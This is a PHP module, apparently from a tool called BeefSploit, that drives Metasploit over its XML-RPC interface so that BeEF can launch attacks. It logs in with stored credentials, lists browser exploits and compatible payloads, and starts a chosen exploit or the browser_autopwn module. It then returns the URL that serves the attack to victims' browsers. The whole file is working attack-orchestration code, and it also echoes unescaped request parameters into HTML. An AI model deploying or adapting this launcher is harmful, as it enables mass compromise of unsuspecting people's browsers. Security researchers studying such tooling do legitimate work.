<?php
// PHP Module for BeefSploit
// By Ryan Linn (sussurro@happypacket.net)
// Please excuse the mess, we are remodeling

require_once('../include/xmlrpc.inc.php');
include("../include/msf.inc.php");
session_start();

if(($sock = msfConnect(MSF_HOST,MSF_PORT)) === FALSE){
	print "error";
	exit;
}

$token = login($sock,MSF_USER,MSF_PASS);

if($token === FALSE)
{
	print "error";
	socket_close($sock);
	exit;
}

if($_REQUEST["call"])
{
	$options = array();
	$exploit = $_REQUEST["exploit"];
	foreach($_REQUEST as $k=>$v)
	{
		if($k != "exploit" && $k != "call" && $k != "PHPSESSID" && $v != "")
		{
			$options[strtoupper($k)] = $v;
		}
	}
		
	$call = $_REQUEST["call"];
	if($call == 1)
	{
		if(callExploit($sock,$token,$exploit,$options) === FALSE)
		{
			print "fail";
		}else{
			print MSF_BASE_URL . ":" . $options["SRVPORT"] . "/" . $options["URIPATH"] ;
		}
	}elseif($call == 2)
	{
		if(callAutopwn($sock,$token,$options) === FALSE)
		{
			print "fail";
		}else{
			print MSF_BASE_URL . ":" . $options["SRVPORT"] . "/" . $options["URIPATH"] ;
		}
	}

}
elseif($_REQUEST["exploit"] && $_REQUEST["payload"])
{
	$exp_opt = getOptions($sock,$token,"exploit",$_REQUEST["exploit"]);
	$pay_opt = getOptions($sock,$token,"payload",$_REQUEST["payload"]);
	$full_options = array_merge($exp_opt,$pay_opt);
	$options = array();
	foreach($full_options as $k=>$v)
	{
		if($v["advanced"] == 1 || $v["evasion"] == 1)
		{
			continue;
		}
		$options[$k] = $v;
	}
	foreach($options as $key=>$value)
	{
		print "<div id=\"module_subsection_header\">";
		print "$key";
		if($value["required"] == 1)
		{
			print "(REQUIRED) :";
		}else{
			print " : ";
		}
		print $value["desc"];
		print "</div>\n";
		if($value["type"] == "bool")
		{
			print "YES: <input type=\"checkbox\" name=\"$key\" value=\"TRUE\">\n";
		}else{
			print "<input type=\"text\" name=\"$key\" value=\"".$value["default"] ."\"/>\n";
		}

	}

}elseif($_GET["exploit"]){
	if(( $payloads = getPayloads($sock,$token,$_GET["exploit"])) === FALSE)
	{
		print "fail";
	}else{
		print "$payloads\n";
	}
}else{
	if(($exploits = getExploits($sock,$token)) === FALSE )
	{
		print "fail";
	}else{
		print $exploits . "\n";
	}
}

socket_close($sock);

function msfConnect($host,$port)
{
	if(!$host || !$port)
	{
		return FALSE;
	}

	$sock = @socket_create(AF_INET,SOCK_STREAM,SOL_TCP);

	if($sock == FALSE)
	{
		return FALSE;
	}

	$connected = @socket_connect($sock,$host,$port);

	if(!$connected)
	{
		return FALSE;
	}

	return $sock;
}


function getOptions($sock,$token,$type,$module)
{
	if(!$sock || !$token || !$type || !$module)
	{
		return FALSE;
	}
	$msg = new xmlrpcmsg("module.options",
		array(  new xmlrpcval($token,"string"),
			new xmlrpcval($type,"string"),
			new xmlrpcval($module,"string")
			));

	$string = $msg->serialize() . "\0";

	socket_write($sock,$string);
	$resp = "";
	$resp .= socket_read($sock,32768);
	$resp = str_replace("\0","",$resp);
	
	$t = php_xmlrpc_decode_xml($resp);
	$val = $t->val;
	$val->structreset();
	$options = array();	
	while(list($key,$v) = $val->structEach())
	{
		$v->structreset();
		$options[$key] = array();
		while(list($k,$v2) = $v->structEach())
		{
			$options[$key][$k] = $v2->scalarVal();
		}
	}

	return $options;
	
}
function getExploits($sock,$token)
{
	if(!$sock || !$token ){
		return FALSE;
	}

	$msg = new xmlrpcmsg("module.exploits",
		array(  new xmlrpcval($token,"string")));

	$string = $msg->serialize() . "\0";

	socket_write($sock,$string);
	$resp = "";
	while(!preg_match("/\/methodResponse/",$resp))
	{
		$resp .= socket_read($sock,2048);
	}
	$resp = str_replace("\0","",$resp);
	
	$t = php_xmlrpc_decode_xml($resp);

	if($t->errno)
	{
		return FALSE;
	}
	$val = $t->val;
	
	$modules = $val->structMem("modules");
	$exploits = array();
	for($i = 0; $i < $modules->arraySize(); $i++)
	{
		$value = $modules->arrayMem($i);
		if(preg_match("/browser/",$value->scalarVal()))
		{
			array_push($exploits,$value->scalarVal());
		}
	}
	sort($exploits);
	return implode("|",$exploits);

}

function getPayloads($sock,$token,$exploit)
{
	if(!$sock || !$token || !$exploit){
		return FALSE;
	}

	$msg = new xmlrpcmsg("module.compatible_payloads",
		array(  new xmlrpcval($token,"string"),
			new xmlrpcval($exploit,"string")));

	$string = $msg->serialize() . "\0";

	socket_write($sock,$string);
	$resp = "";
	$resp .= socket_read($sock,32768);
	$resp = str_replace("\0","",$resp);
	
	$t = php_xmlrpc_decode_xml($resp);

	if($t->errno)
	{
		return FALSE;
	}
	$val = $t->val;
	
	$modules = $val->structMem("payloads");
	$payloads = array();
	for($i = 0; $i < $modules->arraySize(); $i++)
	{
		$value = $modules->arrayMem($i);
		array_push($payloads,$value->scalarVal());
	}
	sort($payloads);
	return implode("|",$payloads);

}

	
	
function callAutopwn($sock,$token,$options)
{
	if(!$sock || !$token || !$options || !is_array($options))
	{
		return FALSE;
	}
	
	$optval = new xmlrpcval;
	$o = array();

	foreach ($options as $k => $v)
	{
		$o[$k] = new xmlrpcval($v,"string");
	}

	$optval->addStruct($o);
	$msg = new xmlrpcmsg("module.execute",
		array(  new xmlrpcval($token,"string"),
			new xmlrpcval("auxiliary","string"),
			new xmlrpcval("server/browser_autopwn","string"),
			$optval));

	$string = $msg->serialize() . "\0";

	socket_write($sock,$string);
	$resp = socket_read($sock,2048);
	$resp = str_replace("\0","",$resp);
	$t = php_xmlrpc_decode_xml($resp);

	if($t->errno)
	{
		return FALSE;
	}
	return TRUE;

}

function callExploit($sock,$token,$exploit,$options)
{
	if(!$sock || !$token || !$exploit || !$options || !is_array($options))
	{
		return FALSE;
	}
	
	$optval = new xmlrpcval;
	$o = array();

	foreach ($options as $k => $v)
	{
		$o[$k] = new xmlrpcval($v,"string");
	}

	$optval->addStruct($o);
	$msg = new xmlrpcmsg("module.execute",
		array(  new xmlrpcval($token,"string"),
			new xmlrpcval("exploit","string"),
			new xmlrpcval($exploit,"string"),
			$optval));

	$string = $msg->serialize() . "\0";

	socket_write($sock,$string);
	$resp = socket_read($sock,2048);
	$resp = str_replace("\0","",$resp);
	$t = php_xmlrpc_decode_xml($resp);

	if($t->errno)
	{
		return FALSE;
	}
	return TRUE;

}

function login($sock,$username,$password)
{
	$msg = new xmlrpcmsg("auth.login",
		array(new xmlrpcval($username,"string"),
		new xmlrpcval($password,"string")));

	$string = $msg->serialize() . "\0";

	socket_write($sock,$string);
	$resp = socket_read($sock,2048);
	$resp = str_replace("\0","",$resp);
	$t = php_xmlrpc_decode_xml($resp);
	if($t->errno)
	{
		return FALSE;
	}

	$token = $t->val->structmem("token");
	return $token->scalarval();

}
?>
